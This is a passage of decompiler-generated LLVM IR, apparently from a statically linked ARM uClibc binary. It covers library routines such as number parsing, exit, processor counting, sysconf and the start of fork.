  %v0_12d4821 = phi i32 [ %v0_12cdc, %bb61 ], [ %v2_12cf8, %bb62 ], [ %v1_12cdc, %dec_label_pc_12cdc ]
  %v0_12cfc = phi i32 [ %v1_12cd0, %bb61 ], [ %v3_12cf4, %bb62 ], [ %v1_12ce8, %dec_label_pc_12cdc ]
  %v5_12d00 = icmp slt i32 %v0_12cfc, 16
  br i1 %v5_12d00, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_12dcc29 = phi i32 [ %v0_12c70, %bb60 ], [ %v1_12dcc30, %.thread8 ], [ %v1_12dcc30, %bb63 ]
  %v0_12d4820 = phi i32 [ %v0_12cdc, %bb60 ], [ %v0_12d4821, %.thread8 ], [ %v0_12d4821, %bb63 ]
  %v0_12d28 = phi i32 [ %v0_12c6c, %bb60 ], [ %v0_12cfc, %.thread8 ], [ 16, %bb63 ]
  %v1_12d04 = add i32 %v0_12d28, -2
  %tmp = icmp ugt i32 %v1_12d04, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_12d14

.thread:                                          ; preds = %bb64
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12dc8

dec_label_pc_12d14:                               ; preds = %bb64
  %v2_12d1c = udiv i32 -1, %v0_12d28
  %v3_12d1c = urem i32 -1, %v0_12d28
  store i32 %v0_12d28, i32* %r1.global-to-local, align 4
  %v1_12d2c = urem i32 %v3_12d1c, 256
  store i32 %v1_12d2c, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i32 %v2_12d1c, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12d48

dec_label_pc_12d44:                               ; preds = %bb71, %dec_label_pc_12da4
  %v0_12d44 = phi i32 [ %v1_12d8444, %bb71 ], [ %v0_12d44.pre, %dec_label_pc_12da4 ]
  br label %dec_label_pc_12d48

dec_label_pc_12d48:                               ; preds = %dec_label_pc_12d14, %dec_label_pc_12d44
  %v1_12dcc27 = phi i32 [ %v1_12dcc29, %dec_label_pc_12d14 ], [ %v0_12d44, %dec_label_pc_12d44 ]
  %v0_12d84 = phi i32 [ %v0_12d4820, %dec_label_pc_12d14 ], [ %v0_12d44, %dec_label_pc_12d44 ]
  %v1_12d48 = inttoptr i32 %v0_12d84 to i8*
  %v2_12d48 = load i8, i8* %v1_12d48, align 1
  %v3_12d48 = zext i8 %v2_12d48 to i32
  %v1_12d4c = add nsw i32 %v3_12d48, -48
  %v1_12d50 = urem i32 %v1_12d4c, 256
  store i32 %v1_12d50, i32* %r1.global-to-local, align 4
  %v1_12d58 = or i32 %v3_12d48, 32
  %tmp79 = icmp ult i32 %v1_12d50, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_12d60

dec_label_pc_12d60:                               ; preds = %dec_label_pc_12d48
  store i32 40, i32* %r1.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_12d58, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_12d60
  %v1_12d64 = add nsw i32 %v1_12d58, -87
  %v5_12d6c = urem i32 %v1_12d64, 256
  store i32 %v5_12d6c, i32* %r1.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_12d48, %dec_label_pc_12d60, %bb65
  %v3_12d9c = phi i32 [ %v1_12d50, %dec_label_pc_12d48 ], [ 40, %dec_label_pc_12d60 ], [ %v5_12d6c, %bb65 ]
  %v1_12d70 = load i32, i32* %r5.global-to-local, align 4
  %v6_12d74 = icmp slt i32 %v3_12d9c, %v1_12d70
  br i1 %v6_12d74, label %dec_label_pc_12d78, label %dec_label_pc_12dc8.loopexit

dec_label_pc_12d78:                               ; preds = %bb66
  %v0_12d78 = load i32, i32* %ip.global-to-local, align 4
  %v1_12d78 = load i32, i32* %r8.global-to-local, align 4
  %v9_12d78 = icmp eq i32 %v0_12d78, %v1_12d78
  br i1 %v9_12d78, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_12d78
  %v1_12d8440 = add i32 %v0_12d84, 1
  store i32 %v1_12d8440, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12d8c

bb67:                                             ; preds = %dec_label_pc_12d78
  %v3_12d78 = icmp ult i32 %v0_12d78, %v1_12d78
  %v1_12d84 = add i32 %v0_12d84, 1
  store i32 %v1_12d84, i32* %r4.global-to-local, align 4
  br i1 %v3_12d78, label %dec_label_pc_12d8c, label %dec_label_pc_12da4

dec_label_pc_12d8c:                               ; preds = %bb67, %.thread39
  %v1_12d8444 = phi i32 [ %v1_12d8440, %.thread39 ], [ %v1_12d84, %bb67 ]
  %v4_12d942443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_12d8c = load i32, i32* %sl.global-to-local, align 4
  %v3_12d8c = icmp uge i32 %v3_12d9c, %v1_12d8c
  %v9_12d8c = icmp eq i32 %v3_12d9c, %v1_12d8c
  %v2_12d90 = xor i1 %v3_12d8c, true
  %v3_12d90 = or i1 %v9_12d8c, %v2_12d90
  br i1 %v3_12d90, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_12d8c
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_12d8c, %bb68
  %v4_12d94 = phi i32 [ %v4_12d942443, %dec_label_pc_12d8c ], [ 0, %bb68 ]
  %v2_12d94 = xor i1 %v9_12d8c, true
  %v3_12d94 = and i1 %v3_12d8c, %v2_12d94
  br i1 %v3_12d94, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_12d94 = urem i32 %v4_12d94, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_12d98 = phi i32 [ %v5_12d94, %bb70 ], [ %v4_12d94, %bb69 ]
  %v2_12d98 = icmp eq i32 %v0_12d98, 0
  br i1 %v2_12d98, label %bb71, label %dec_label_pc_12da4

bb71:                                             ; preds = %thread-pre-split
  %v4_12d9c = mul i32 %v0_12d78, %v1_12d70
  %v5_12d9c = add i32 %v4_12d9c, %v3_12d9c
  store i32 %v5_12d9c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12d44

dec_label_pc_12da4:                               ; preds = %bb67, %thread-pre-split
  %v0_12dac = call i32 @__aeabi_read_tp()
  %v0_12db0 = load i32, i32* %r7.global-to-local, align 4
  %v2_12db0 = and i32 %v0_12c74, %v0_12db0
  store i32 %v2_12db0, i32* %r7.global-to-local, align 4
  %v0_12db4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_12db4, i32* %ip.global-to-local, align 4
  %v3_12db8 = load i16, i16* @global_var_21510.336, align 2
  %v4_12db8 = sext i16 %v3_12db8 to i32
  %v3_12dc0 = add i32 %v4_12db8, %v0_12dac
  %v4_12dc0 = inttoptr i32 %v3_12dc0 to i32*
  store i32 34, i32* %v4_12dc0, align 4
  %v0_12d44.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12d44

dec_label_pc_12dc8.loopexit:                      ; preds = %bb66
  %v0_12dc8.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_12dc8

dec_label_pc_12dc8:                               ; preds = %.thread, %dec_label_pc_12dc8.loopexit
  %v1_12dcc = phi i32 [ %v1_12dcc27, %dec_label_pc_12dc8.loopexit ], [ %v1_12dcc29, %.thread ]
  %v2_12dcc = phi i32 [ %v0_12dc8.pre, %dec_label_pc_12dc8.loopexit ], [ %v0_12c68, %.thread ]
  %v2_12dc8 = icmp eq i32 %v2_12dcc, 0
  br i1 %v2_12dc8, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_12dc8
  %v3_12dcc = inttoptr i32 %v2_12dcc to i32*
  store i32 %v1_12dcc, i32* %v3_12dcc, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_12dc8, %bb72
  %v0_12dd4 = load i32, i32* %r7.global-to-local, align 4
  %v2_12dd4 = icmp eq i32 %v0_12dd4, 0
  %. = select i1 %v2_12dd4, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r1.global-to-local, align 4
  %v2_12de0 = icmp eq i32 %v0_12c74, 0
  %v0_12e0c.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_12de0, label %dec_label_pc_12e04, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_12e0c.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_12dec, label %dec_label_pc_12e04

dec_label_pc_12dec:                               ; preds = %bb76
  %v0_12df0 = call i32 @__aeabi_read_tp()
  %v3_12df4 = load i16, i16* @global_var_21510.336, align 2
  %v4_12df4 = sext i16 %v3_12df4 to i32
  %v3_12dfc = add i32 %v4_12df4, %v0_12df0
  %v4_12dfc = inttoptr i32 %v3_12dfc to i32*
  store i32 34, i32* %v4_12dfc, align 4
  %v0_12e00 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_12e00, i32* %ip.global-to-local, align 4
  %v0_12e04.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12e04

dec_label_pc_12e04:                               ; preds = %bb76, %bb73, %dec_label_pc_12dec
  %v0_12e0c.pre = phi i32 [ %v0_12e0c.pre.pre, %bb76 ], [ %v0_12e00, %dec_label_pc_12dec ], [ %v0_12e0c.pre.pre, %bb73 ]
  %v0_12e04 = phi i32 [ %v0_12dd4, %bb76 ], [ %v0_12e04.pre, %dec_label_pc_12dec ], [ %v0_12dd4, %bb73 ]
  %v2_12e04 = icmp eq i32 %v0_12e04, 0
  br i1 %v2_12e04, label %dec_label_pc_12e04._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_12e04
  %v2_12e08 = sub i32 0, %v0_12e0c.pre
  store i32 %v2_12e08, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12e04._crit_edge

dec_label_pc_12e04._crit_edge:                    ; preds = %dec_label_pc_12e04, %bb77
  %v0_12e0c = phi i32 [ %v2_12e08, %bb77 ], [ %v0_12e0c.pre, %dec_label_pc_12e04 ]
  ret i32 %v0_12e0c

; uselistorder directives
  uselistorder i32 %v0_12e0c.pre, { 1, 0 }
  uselistorder i32 %v0_12e0c.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_12d94, { 1, 0 }
  uselistorder i1 %v3_12d8c, { 1, 0 }
  uselistorder i32 %v1_12d8c, { 1, 0 }
  uselistorder i32 %v5_12d6c, { 1, 0 }
  uselistorder i32 %v1_12d58, { 1, 0 }
  uselistorder i32 %v1_12d50, { 2, 0, 1 }
  uselistorder i32 %v0_12d84, { 1, 0, 2 }
  uselistorder i32 %v0_12d44, { 1, 0 }
  uselistorder i32 %v3_12cf4, { 1, 0 }
  uselistorder i32 %v1_12ce8, { 1, 0, 2 }
  uselistorder i32 %v0_12cdc, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_12cb8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_12c74, { 1, 0 }
  uselistorder i32 %v0_12c70, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12c6c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 0, 7, 1, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 34, { 1, 2, 0, 4, 5, 3, 6 }
  uselistorder i8 48, { 1, 0, 2 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_12e04._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12e04, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_12dc8, { 1, 0 }
  uselistorder label %dec_label_pc_12da4, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12d48, { 1, 0 }
  uselistorder label %dec_label_pc_12d44, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12cbc, { 1, 0 }
  uselistorder label %dec_label_pc_12cb8, { 1, 0 }
  uselistorder label %dec_label_pc_12c80, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @r5, align 4
  %v4_12e38 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 140) to i32*), align 4
  store i32 %v4_12e38, i32* @r4, align 4
  %v2_12e40 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_12e58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12e58)
  %v0_12e6c = load i32, i32* @r5, align 4
  %v2_12e6c = add i32 %v0_12e6c, 16
  %v3_12e6c = inttoptr i32 %v2_12e6c to i32*
  %v4_12e6c = load i32, i32* %v3_12e6c, align 4
  call void @__pseudo_branch(i32 %v4_12e6c)
  %v0_12e7c = load i32, i32* @r5, align 4
  %v2_12e7c = add i32 %v0_12e7c, 632
  %v3_12e7c = inttoptr i32 %v2_12e7c to i32*
  %v4_12e7c = load i32, i32* %v3_12e7c, align 4
  %v2_12e84 = icmp eq i32 %v4_12e7c, 0
  br i1 %v2_12e84, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_12e90 = xor i1 %v2_12e84, true
  call void @__pseudo_cond_branch(i1 %v2_12e90, i32 %v4_12e7c)
  store i32 %v2_12e40, i32* @r0, align 4
  %v0_12ea0 = load i32, i32* @r5, align 4
  %v2_12ea0 = add i32 %v0_12ea0, 44
  %v3_12ea0 = inttoptr i32 %v2_12ea0 to i32*
  %v4_12ea0 = load i32, i32* %v3_12ea0, align 4
  call void @__pseudo_branch(i32 %v4_12ea0)
  %v0_12eac = call i32 @__GI___uClibc_fini()
  %v0_12eb4 = load i32, i32* @r5, align 4
  %v2_12eb4 = add i32 %v0_12eb4, -47748
  %v2_12ebc = icmp eq i32 %v2_12eb4, 0
  br i1 %v2_12ebc, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_12ec4 = xor i1 %v2_12ebc, true
  call void @__pseudo_cond_branch(i1 %v2_12ec4, i32 %v2_12eb4)
  %v0_12ec8 = load i32, i32* @r6, align 4
  %v1_12ecc = call i32 @__GI__exit(i32 %v0_12ec8)
  %v0_12ed0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12ed0, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v3_12ed0 = load i32, i32* @r6, align 4
  %v4_12ed0 = lshr i32 %v4_12ea0, %v3_12ed0
  %v5_12ed0 = sub i32 32, %v3_12ed0
  %v6_12ed0 = shl i32 %v4_12ea0, %v5_12ed0
  %v7_12ed0 = or i32 %v6_12ed0, %v4_12ed0
  %v9_12ed0 = and i32 %v7_12ed0, %v1_12ecc
  store i32 %v9_12ed0, i32* @lr, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v4_12ee8 = phi i32 [ %v1_12ecc, %bb9 ], [ 0, %bb10 ]
  ret i32 %v4_12ee8

; uselistorder directives
  uselistorder i32 %v1_12ecc, { 1, 0 }
  uselistorder i32 %v4_12ea0, { 1, 0, 2 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 -34012), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_12f10 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 -34012))
  store i32 %v1_12f10, i32* @r6, align 4
  %v2_12f14 = icmp eq i32 %v1_12f10, 0
  br i1 %v2_12f14, label %dec_label_pc_12f94, label %dec_label_pc_12f1c

dec_label_pc_12f1c:                               ; preds = %entry
  store i32 272, i32* @sl, align 4
  %v0_12f24 = load i32, i32* @r4, align 4
  %v2_12f24 = add i32 %v0_12f24, -34000
  store i32 %v2_12f24, i32* @r8, align 4
  %v2_12f28 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_12f28, i32* @r7, align 4
  br label %bb18

dec_label_pc_12f30:                               ; preds = %bb18
  %v3_12f30 = load i32, i32* %stack_var_-36, align 4
  %v1_12f34 = inttoptr i32 %v3_12f30 to i32*
  %v2_12f34 = load i32, i32* %v1_12f34, align 4
  %v1_12f38 = inttoptr i32 %v2_12f34 to i8*
  %v2_12f38 = load i8, i8* %v1_12f38, align 1
  %v7_12f3c = icmp eq i8 %v2_12f38, 99
  br i1 %v7_12f3c, label %dec_label_pc_12f44, label %.backedge3

dec_label_pc_12f44:                               ; preds = %dec_label_pc_12f30
  %v1_12f44 = add i32 %v2_12f34, 1
  %v2_12f44 = inttoptr i32 %v1_12f44 to i8*
  %v3_12f44 = load i8, i8* %v2_12f44, align 1
  %v7_12f48 = icmp eq i8 %v3_12f44, 112
  br i1 %v7_12f48, label %dec_label_pc_12f50, label %.backedge3

dec_label_pc_12f50:                               ; preds = %dec_label_pc_12f44
  %v1_12f50 = add i32 %v2_12f34, 2
  %v2_12f50 = inttoptr i32 %v1_12f50 to i8*
  %v3_12f50 = load i8, i8* %v2_12f50, align 1
  %v7_12f54 = icmp eq i8 %v3_12f50, 117
  br i1 %v7_12f54, label %dec_label_pc_12f5c, label %.backedge3

dec_label_pc_12f5c:                               ; preds = %dec_label_pc_12f50
  %v1_12f5c = add i32 %v2_12f34, 3
  %v2_12f5c = inttoptr i32 %v1_12f5c to i8*
  %v3_12f5c = load i8, i8* %v2_12f5c, align 1
  %v4_12f5c = zext i8 %v3_12f5c to i32
  %v0_12f60 = load i32, i32* @r4, align 4
  %v1_12f60 = load i32, i32* @sl, align 4
  %v2_12f60 = add i32 %v1_12f60, %v0_12f60
  %v3_12f60 = inttoptr i32 %v2_12f60 to i32*
  %v4_12f60 = load i32, i32* %v3_12f60, align 4
  %v2_12f64 = mul nuw nsw i32 %v4_12f5c, 2
  %v2_12f68 = add i32 %v4_12f60, %v2_12f64
  %v3_12f68 = inttoptr i32 %v2_12f68 to i16*
  %v4_12f68 = load i16, i16* %v3_12f68, align 2
  %v1_12f6c = and i16 %v4_12f68, 8
  %v2_12f6c = icmp eq i16 %v1_12f6c, 0
  br i1 %v2_12f6c, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_12f5c
  %v1_12f70 = load i32, i32* @r5, align 4
  %v2_12f70 = add i32 %v1_12f70, 1
  store i32 %v2_12f70, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_12f5c, %dec_label_pc_12f30, %dec_label_pc_12f44, %dec_label_pc_12f50
  %v0_12f74.pre = load i32, i32* @r6, align 4
  %v0_12f80.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_12f1c
  %v0_12f80 = phi i32 [ %v0_12f80.pre, %.backedge3 ], [ %v2_12f24, %dec_label_pc_12f1c ]
  %v0_12f74 = phi i32 [ %v0_12f74.pre, %.backedge3 ], [ %v1_12f10, %dec_label_pc_12f1c ]
  %v4_12f84 = inttoptr i32 %v0_12f74 to i32*
  %v5_12f84 = call i32 @__GI_config_read(i32* %v4_12f84, i32 %v2_12f28, i32 258, i32 %v0_12f80)
  %v2_12f88 = icmp eq i32 %v5_12f84, 0
  br i1 %v2_12f88, label %dec_label_pc_12ff8, label %dec_label_pc_12f30

dec_label_pc_12f94:                               ; preds = %entry
  %v0_12f98 = load i32, i32* @r4, align 4
  %v2_12f98 = add i32 %v0_12f98, -33996
  store i32 %v2_12f98, i32* @r0, align 4
  %v1_12f9c = call i32 @__GI_config_open(i32 %v2_12f98)
  store i32 %v1_12f9c, i32* @r6, align 4
  %v2_12fa0 = icmp eq i32 %v1_12f9c, 0
  br i1 %v2_12fa0, label %bb19, label %dec_label_pc_12fac

bb19:                                             ; preds = %dec_label_pc_12f94
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12ff8

dec_label_pc_12fac:                               ; preds = %dec_label_pc_12f94
  %v0_12fb0 = load i32, i32* @r4, align 4
  %v2_12fb0 = add i32 %v0_12fb0, -33980
  store i32 %v2_12fb0, i32* @r8, align 4
  %v2_12fb8 = add i32 %v0_12fb0, -33944
  store i32 %v2_12fb8, i32* @r7, align 4
  %v2_12fbc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_12fbc, i32* @r4, align 4
  br label %bb21

dec_label_pc_12fc4:                               ; preds = %bb21
  %v0_12ff0 = load i32, i32* @r8, align 4
  %v3_12fc4 = load i32, i32* %stack_var_-36, align 4
  %v1_12fc8 = inttoptr i32 %v3_12fc4 to i32*
  %v2_12fc8 = load i32, i32* %v1_12fc8, align 4
  store i32 %v2_12fc8, i32* @r1, align 4
  %v2_12fcc = inttoptr i32 %v0_12ff0 to i8*
  %v3_12fcc = call i32 @__GI_strcoll(i8* %v2_12fcc, i32 %v2_12fc8)
  %v2_12fd0 = icmp eq i32 %v3_12fcc, 0
  br i1 %v2_12fd0, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_12fc4
  %v1_12fd4 = load i32, i32* @r5, align 4
  %v2_12fd4 = add i32 %v1_12fd4, 1
  store i32 %v2_12fd4, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_12fc4
  %v0_12fe0.pre = load i32, i32* @r7, align 4
  %v0_12fe4.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_12fac
  %v0_12fe4 = phi i32 [ %v0_12fe4.pre, %.backedge ], [ %v1_12f9c, %dec_label_pc_12fac ]
  %v0_12fe0 = phi i32 [ %v0_12fe0.pre, %.backedge ], [ %v2_12fb8, %dec_label_pc_12fac ]
  %v4_12fe8 = inttoptr i32 %v0_12fe4 to i32*
  %v5_12fe8 = call i32 @__GI_config_read(i32* %v4_12fe8, i32 %v2_12fbc, i32 459266, i32 %v0_12fe0)
  %v2_12fec = icmp eq i32 %v5_12fe8, 0
  br i1 %v2_12fec, label %dec_label_pc_12ff8, label %dec_label_pc_12fc4

dec_label_pc_12ff8:                               ; preds = %bb18, %bb21, %bb19
  %v0_12ff8 = load i32, i32* @r6, align 4
  %v1_12ffc = inttoptr i32 %v0_12ff8 to i32*
  %v2_12ffc = call i32 @__GI_config_close(i32* %v1_12ffc)
  %v0_13000 = load i32, i32* @r5, align 4
  %v2_13000 = icmp eq i32 %v0_13000, 0
  %.v0_13000 = select i1 %v2_13000, i32 1, i32 %v0_13000
  ret i32 %.v0_13000

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_12ff8, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_1342c

bb:                                               ; preds = %entry
  %v7_13050 = mul i32 %arg1, 4
  %v8_13050 = add i32 %v7_13050, ptrtoint (i32* @global_var_13058.482 to i32)
  call void @__pseudo_branch(i32 %v8_13050)
  br label %dec_label_pc_1342c

dec_label_pc_1342c:                               ; preds = %bb, %entry
  %v0_13430 = call i32 @__aeabi_read_tp()
  %v3_13434 = load i16, i16* @global_var_21510.336, align 2
  %v4_13434 = sext i16 %v3_13434 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_13440 = add i32 %v4_13434, %v0_13430
  %v4_13440 = inttoptr i32 %v3_13440 to i32*
  store i32 22, i32* %v4_13440, align 4
  %v0_13624 = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_13624

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_13660 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_13660, i32* @ip, align 4
  store i32 12768, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* %r8.global-to-local, align 4
  %v4_1375016 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 12768) to i32*), align 4
  store i32 %v4_1375016, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1375418 = icmp eq i32 %v4_1375016, 0
  br i1 %v2_1375418, label %dec_label_pc_1375c, label %dec_label_pc_13680

dec_label_pc_13680:                               ; preds = %entry, %dec_label_pc_13750.backedge
  store i32 -61441, i32* @ip, align 4
  call void @__pseudo_branch(i32 -61536)
  %v0_1368c = load i32, i32* %r7.global-to-local, align 4
  %v1_1368c = add i32 %v0_1368c, 20
  %v2_1368c = inttoptr i32 %v1_1368c to i32*
  %v3_1368c = load i32, i32* %v2_1368c, align 4
  store i32 %v3_1368c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13690 = icmp eq i32 %v3_1368c, 0
  store i32 %v3_1368c, i32* %r4.global-to-local, align 4
  br i1 %v2_13690, label %dec_label_pc_13750.backedge, label %dec_label_pc_136a0

dec_label_pc_13750.backedge:                      ; preds = %dec_label_pc_13680, %dec_label_pc_136cc
  %v0_13750 = load i32, i32* %r8.global-to-local, align 4
  %v1_13750 = load i32, i32* %r5.global-to-local, align 4
  %v2_13750 = add i32 %v1_13750, %v0_13750
  %v3_13750 = inttoptr i32 %v2_13750 to i32*
  %v4_13750 = load i32, i32* %v3_13750, align 4
  store i32 %v4_13750, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13754 = icmp eq i32 %v4_13750, 0
  br i1 %v2_13754, label %dec_label_pc_1375c, label %dec_label_pc_13680

dec_label_pc_136a0:                               ; preds = %dec_label_pc_13680
  %v0_136a0 = load i32, i32* %r8.global-to-local, align 4
  %v1_136a0 = load i32, i32* %r5.global-to-local, align 4
  %v2_136a0 = add i32 %v1_136a0, %v0_136a0
  %v3_136a0 = inttoptr i32 %v2_136a0 to i32*
  %v4_136a0 = load i32, i32* %v3_136a0, align 4
  %v1_136a4 = add i32 %v4_136a0, 20
  store i32 %v1_136a4, i32* %r2.global-to-local, align 4
  %v1_136a8132 = inttoptr i32 %v1_136a4 to i32*
  %v2_136a8133 = load i32, i32* %v1_136a8132, align 4
  store i32 %v2_136a8133, i32* %r3.global-to-local, align 4
  %v3_136ac135 = icmp uge i32 %v2_136a8133, %v3_1368c
  store i1 %v3_136ac135, i1* %cpsr_c.global-to-local, align 1
  %v9_136ac141 = icmp eq i32 %v2_136a8133, %v3_1368c
  br i1 %v9_136ac141, label %dec_label_pc_136b4, label %dec_label_pc_136cc

dec_label_pc_136b4:                               ; preds = %dec_label_pc_136a0, %dec_label_pc_136b4.dec_label_pc_136a8_crit_edge
  %v0_136b4142 = phi i32 [ %v1_136ac.pre, %dec_label_pc_136b4.dec_label_pc_136a8_crit_edge ], [ %v3_1368c, %dec_label_pc_136a0 ]
  store i32 %v0_136b4142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_136c4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_136c4, label %dec_label_pc_136c8, label %dec_label_pc_136b4.dec_label_pc_136a8_crit_edge

dec_label_pc_136b4.dec_label_pc_136a8_crit_edge:  ; preds = %dec_label_pc_136b4
  %v0_136a8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_136ac.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_136a8 = inttoptr i32 %v0_136a8.pre to i32*
  %v2_136a8 = load i32, i32* %v1_136a8, align 4
  store i32 %v2_136a8, i32* %r3.global-to-local, align 4
  %v3_136ac = icmp uge i32 %v2_136a8, %v1_136ac.pre
  store i1 %v3_136ac, i1* %cpsr_c.global-to-local, align 1
  %v9_136ac = icmp eq i32 %v2_136a8, %v1_136ac.pre
